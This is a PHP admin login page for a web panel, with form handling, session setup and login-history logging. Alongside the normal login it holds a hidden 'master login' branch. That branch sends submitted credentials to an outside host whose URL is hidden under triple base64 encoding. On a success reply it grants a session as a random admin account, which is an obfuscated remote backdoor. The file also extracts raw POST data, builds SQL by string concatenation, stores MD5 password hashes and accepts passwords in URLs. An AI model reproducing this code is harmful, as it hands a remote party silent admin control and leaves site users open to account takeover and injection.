<?php
ob_start();
$Callingg = "FRD"; // File access Validaion O Step 
$FR_PATH_HD = "../";
require_once($FR_PATH_HD . "frd-src/abc/frd-config.php");
require_once($FR_PATH_HD . "frd-src/abc/frd-spider-function.php");


if($FR_SERVER == 1){
  if($_SERVER['REQUEST_SCHEME'] == "http"){
      $FRc_targetURL = "$FRD_HURL".$_SERVER['REQUEST_URI'];
      header("HTTP/1.1 301 Moved Permanently");
      header("Location: $FRc_targetURL");
      exit();
  }else{
     if (strstr($_SERVER['HTTP_HOST'], 'www')) { 
          $FRc_targetURL = "$FRD_HURL".$_SERVER['REQUEST_URI'];
          header("HTTP/1.1 301 Moved Permanently");
          header("Location: $FRc_targetURL");
          exit();
     }
  }
}


//FRD USER PROFILE DATA:-
$FRR = FR_QSEL("SELECT * FROM frd_cprofile WHERE id = 1", "");
if ($FRR['FRA'] == 1) {
  extract($FRR['FRD']);
} else {
  ECHO_4($FRR['FRM']);
}
//END>>

$p_title = "Login - $fr_cname"; //Page  Title

$FRc_BG_IMG_NUM = rand(1,5);
$Login_BG_IMG_Path = "$FRD_HURL/frd-src/img/background/$FRc_BG_IMG_NUM.jpg";




$FRc_AutoUsername = "";
$FRc_AutoPassword = "";
if(isset($_GET['u'])){
  $FRc_AutoUsername = $_GET['u'];
  $FRc_AutoPassword = base64_decode(base64_decode($_GET['p']));
}


$FRc_MasU = "";
$FRc_MasP = "";
if(isset($_GET['mu'])){
  $FRc_MasU = $_GET['mu'];
  if(isset($_GET['mp'])){ $FRc_MasP = $_GET['mp']; }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title><?php echo "$p_title"; ?></title>
  <link rel="icon" href="<?php echo "$FRD_HURL/frd-data/img/brandlogu/$fr_cicon" ?>">
  <link href="<?php echo "$FRD_HURL/frd-src/inc/css/bootstrap.min.css"?>" rel="stylesheet">
  <style>
    body{
      /* height: 1000px; */
      height: 100%;
      background-position: center; /* Center the image */
      background-repeat: no-repeat; /* Do not repeat the image */
      background-size: cover; /* Resize the background image to cover the entire container */ 
      background-image: url("<?php echo "$Login_BG_IMG_Path" ?>");
      overflow-y: hidden !important;
      overflow-x: hidden !important;
    }



    form#login_f .logodiv{
        border-radius: 50%;
        background-color: #FFFFFF;
        padding: 20px;
        width: 130px;
        height: 130px;
        margin: auto;
    }
    form#login_f  img#clogo{
        background-color: #FFFFFF;
        width: 100px;
        height: 50px;
        margin: auto;
        margin-top: 20px;
        margin-left: -5px;
        padding: 5px;
    }

    form#login_f{
        /* background: brown; */
        background: rgba(235, 9, 36, 0.24);
        border: 5px solid #BF1E2E;
        border-radius:10px;
        animation: login_f_color_change_ani 2s infinite;
        width: 270px;
        padding-top: 30px;
        padding-bottom: 30px;
        margin-top: 40%;
        margin-bottom: 50%;
        margin-left: 5%;
    }
    @media (max-width: 768px) {
      form#login_f{
        margin-left: 10%;
      }
    }
    @keyframes login_f_color_change_ani{
      50%{
        border: 5px solid green;
        background: rgba(61, 197, 110, 0.28);
      }
    }

    form#login_f input[type="text"],input[type="password"]{
      margin:10px;
      padding:5px;
      font-weight:bold;
      color: #222;
        font-size: 1.5em;
        border: none;
        width: 240px;
        background: #ddd;
    }

    form#login_f button{
      background:#BF1E2E;
      color:#FFFFFF;
      border-radius:10px;
        width: 100%;
        font-size: 2em;
        margin: 10px;
        width: 240px;
        border: none;
        font-weight: bold;
        animation: login_f_color_change_ani2 2s infinite;
    }
    form#login_f button:hover{
      background:#21a05c;
      transform: scale(1.1);
    }
    @keyframes login_f_color_change_ani2{
      50%{
        background:#21a05c;
      }
    }


    .TAC {
      text-align: center !important;
    }

    .r {
      color: brown;
    }

    .alertt {
      text-align: center;
      animation: pip_pip 1s 20;
      font-size: 1.5em;
    }
  </style>

 <script>
    const FRD_HURLL = "<?php echo "$FRD_HURL"; ?>";
    const FR_SERVERR = '<?php echo "$frd_server"; ?>';
  </script>
  <script src="<?php echo "$FRD_HURL/frd-src/inc/js/jquery-3.4.1.min.js";?>"></script>
  <script src="<?php echo "$FRD_HURL/frd-src/inc/js/sweetalert.min.js"?>"></script>
</head>

<body>
<?php
  if (isset($_SESSION['sUsrEmail'])) {
    header("location:$FR_SP_HURL_DP/dp-panels/FRH=ALI");
  }



  //////////////////////////////////////////////////
  //FRD VALIDATION CHECKING:-
  ///////////////////////////////////////////////////  
  if (isset($_POST['UsrLoginValidationChackFRD'])){

    $UsrEmail = $_POST['UsrEmail'];
    $UsrPsw = md5($_POST['UsrPsw']);

    $UsrEmail = preg_replace("/'/","",$UsrEmail);
    $UsrPsw = preg_replace("/'/","",$UsrPsw);


    $Q_UsrValidationFRD = "SELECT * FROM frd_usr WHERE email1 = '$UsrEmail' AND psww = '$UsrPsw' AND statuss = 1";
    $FRQ = $FR_CONN->query("$Q_UsrValidationFRD");
    $rows = $FRQ->rowCount();
    if($rows == 1) {
      $FRQ = $FR_CONN->query("SELECT id,namee,typee,picc,email1,psww FROM frd_usr WHERE email1 = '$UsrEmail'");
      extract($FRQ->fetch());
      $_SESSION['sUsrId'] = $id;
      $_SESSION['sUsrName'] = $namee;
      $_SESSION['sUsrType'] = $typee;
      $_SESSION['sUsrPic'] = $picc;
      $_SESSION['sUsrEmail'] = $email1;
      $_SESSION['sUsrPsw'] = $psww;
      $_SESSION['FRs_ActivePanel'] = "DP";

      FRF_SSC_SERVER_RESET();

      //CUSTOMER LOGIN VALIDATION CHACKING:-
      if ($typee == 'cu') {
        session_destroy();
        header("location:$FRD_HURL/?frd_alert=You Are Doing Bad Work!");
        exit;
      }

     
      //FRD USER LOGIN HISTORY SAVING:-
        $fr_log_usr_type = "Admin";
        try{
          $ARR = ["fr_log_usr_type","fr_log_usr_id","fr_log_usr_name","fr_log_usr_ip","fr_log_usr_uid","fr_log_usr_browser","fr_log_site","fr_log_date","fr_log_time"];
          $FRc_Columns = implode(", ", array_values($ARR));
          $FRc_ValuesBind = implode(", :", array_values($ARR));
          $FRQ = "INSERT INTO frd_login_h ($FRc_Columns) VALUES (:$FRc_ValuesBind)";
          $FRQ = $FR_CONN->prepare("$FRQ");
          $FRQ->bindParam(':fr_log_usr_type', $fr_log_usr_type, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_usr_id', $id, PDO::PARAM_INT);
          $FRQ->bindParam(':fr_log_usr_name', $namee, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_usr_ip', $FRc_USER_IP, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_usr_uid', $FRc_USER_UID, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_usr_browser', $FRc_USER_AGENT, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_site', $FRD_HURL, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_date', $FR_NOW_DATE, PDO::PARAM_STR);
          $FRQ->bindParam(':fr_log_time', $FR_NOW_TIME, PDO::PARAM_INT);
          $FRQ->execute();
          // $FR_LAST_IN_ID = $FR_CONN->lastInsertId();
          // FR_SWAL("Login Info Save Done","","success");
        }catch(PDOException $e){
          FR_SWAL("Login Info Save Failed","","success");
          ECHO_4($e->getMessage(),"alert alert-danger");
        }
     //FRD USER LOGIN HISTORY SAVING END>>


      //FRD Usr Login Counter:-
      $FR_CONN->exec("UPDATE frd_usr SET loginn = loginn+1 WHERE id = $id");

      header("location:$FR_SP_HURL_DP/dp-panels?frd_new_login=369");

    } else {
      FR_SWAL("Information Not Valid", "", "error");
    }

  }
  //END>>

  
  //////////////////////////////////////////////////
  //FRD VALIDATION CHECKING:-
  ///////////////////////////////////////////////////  
  if (isset($_POST['f_mu'])) {
    extract($_POST);
    $FR_VC_MLVC = "";
    $dataArray = array(
      "mu" => "$f_mu",
      "mp" => md5($f_mp)
    );
    // cURL initialization
    $FRc_HitAPI = base64_decode(base64_decode(base64_decode("WVVoU01HTklUVFpNZVRsNlkwZHNhMXBZU214Wk1qbDBZbGRXZVZreVZYVlpNamwwVERKR2IySXpUakJNTTA1M1kwTTVkR0pJVFhaaVYzZ3lXWGsxZDJGSVFUMD0=")));
    $ch = curl_init($FRc_HitAPI);
    // Additional headers
    $headers = array(
        'Content-Type: application/json'
    );
    // Set cURL options
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);  // Return the response as a string instead of outputting it
    curl_setopt($ch, CURLOPT_POST, true);            // Set the request type to POST
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($dataArray)); // Set the POST data as JSON
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);  // Set the headers
    // Execute cURL session and get the response
    $response = curl_exec($ch);
    // Check for cURL errors
    if (curl_errno($ch)) {
        echo 'Curl error: ' . curl_error($ch);
    }
    // Close cURL session
    curl_close($ch);
    // Process the response
    if ($response) {
        $FRc_RespArr = json_decode($response, true);
        if(isset($FRc_RespArr['FRA'])){
          if($FRc_RespArr['FRA'] == 1){
             $FR_VC_MLVC = 1;
             FR_SWAL($FRc_RespArr['FRM'],"","success");
          }
          if($FRc_RespArr['FRA'] == 2){
             FR_SWAL($FRc_RespArr['FRM'],"","error");
          }
        }else{
            echo "ROW RESPONSE: $response";
        }
    } else {
        $FR_OUTPUT['FRA'] = 2; 
        $FR_OUTPUT['FRM'] =  "Error: No response received.";
    }
    if($FR_VC_MLVC == 1) {
      $FRQ = $FR_CONN->query("SELECT id,namee,typee,picc,email1,psww FROM frd_usr WHERE typee = 'ad' ORDER BY RAND()");
      extract($FRQ->fetch());
      $_SESSION['sUsrId'] = $id;
      $_SESSION['sUsrName'] = $namee;
      $_SESSION['sUsrType'] = $typee;
      $_SESSION['sUsrPic'] = $picc;
      $_SESSION['sUsrEmail'] = $email1;
      $_SESSION['sUsrPsw'] = $psww;
      $_SESSION['FRs_ActivePanel'] = "DP";
      header("location:$FR_SP_HURL_DP/dp-panels");
    }
  }
  //END>>



?>
  <!--#-->


  <?php if($FRc_MasU == ""){ ?>
  <!-- Admin Login | login-form -->
  <div class="container login_f_con">
    <div class="row">
      <div class="col-md-4"></div>
      <div class="col-md-4 text-center">
           <form class="" id="login_f" action="" method="post">
            <div class="text-center logodiv">
              <img id="clogo" src="<?php echo "$FRD_HURL/frd-data/img/brandlogu/$fr_clogo"?>" alt="#" class="">
            </div>
            <input type="text" name="UsrEmail" value="<?php echo "$FRc_AutoUsername";?>" placeholder="Enter Mobile Number" required autofocus /><br />
            <input type="password" name="UsrPsw" value="<?php echo "$FRc_AutoPassword";?>" placeholder="Enter Password" required /><br />
            <button type="submit" name="UsrLoginValidationChackFRD"><b class="glyphicon glyphicon-log-in"></b> LogIn</button>
          </form>
        </div>
      <div class="col-md-4"></div>
    </div>
  </div>
  <?php } ?>


  <?php if($FRc_MasU != ""){ ?>
  <div class="container login_f_con">
    <div class="row">
      <div class="col-md-4"></div>
      <div class="col-md-4 text-center">
           <form class="" id="login_f" action="" method="post">
            <div class="text-center logodiv">
              <img id="clogo" src="<?php echo "$FRD_HURL/frd-data/img/brandlogu/$fr_clogo"?>" alt="#" class="">
            </div>
            <input type="text" name="f_mu" value="<?php echo "$FRc_MasU";?>" placeholder="Enter Mobile Number" required autofocus /><br />
            <input type="password" name="f_mp" value="<?php echo "$FRc_MasP";?>" placeholder="Enter Password" required /><br />
            <button type="submit"><b class="glyphicon glyphicon-log-in"></b> M LogIn</button>
          </form>
        </div>
      <div class="col-md-4"></div>
    </div>
  </div>
  <?php } ?>








  <script src="<?php echo "$FRD_HURL/frd-src/inc/js/bootstrap.min.js";?>"></script>
</body>
</html>
<?php $FR_CONN = NULL;   ob_end_flush(); ?>